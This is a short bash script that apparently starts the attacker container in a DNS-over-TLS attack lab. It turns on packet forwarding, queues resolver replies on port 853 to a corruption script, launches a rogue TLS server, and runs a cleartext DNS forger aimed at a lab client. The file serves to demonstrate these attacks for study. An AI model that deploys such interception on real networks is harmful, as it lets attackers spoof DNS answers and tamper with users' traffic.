#!/bin/bash
set -e
rm -f /tmp/forge_enabled /tmp/forge_cleartext_enabled

sysctl -w net.ipv4.ip_forward=1 >/dev/null

# Attack (i)'s NFQUEUE hook: every resolver(853)->client packet this
# container forwards (it sits on the always-on reply-diversion route
# edge-router sets up) is queued to corrupt.py, which only actually
# mutates it when /tmp/forge_enabled exists.
iptables -A FORWARD -p tcp --sport 853 -j NFQUEUE --queue-num 0

cd /opt/attacker

# Attack (ii)'s rogue TLS listener -- inert until edge-router's DNAT
# rule points traffic at it.
python3 ./rogue_tls_server.py > /var/log/rogue_tls.log 2>&1 &

# Bonus/chained demo: the exact Phase 6 cleartext forger, targeting the
# PERMISSIVE client specifically (172.16.1.11 -- the strict client never
# falls back to cleartext, so forging that leg for it would do nothing),
# toggled independently via /tmp/forge_cleartext_enabled. Used only to
# show what an encrypted last mile still doesn't protect (7.4): a
# permissive client that falls back to cleartext re-opens Phase 6
# exactly.
./interceptor eth0 172.16.1.11 example.com. 172.16.1.30 /tmp/forge_cleartext_enabled \
  > /var/log/interceptor.log 2>&1 &

exec python3 ./corrupt.py
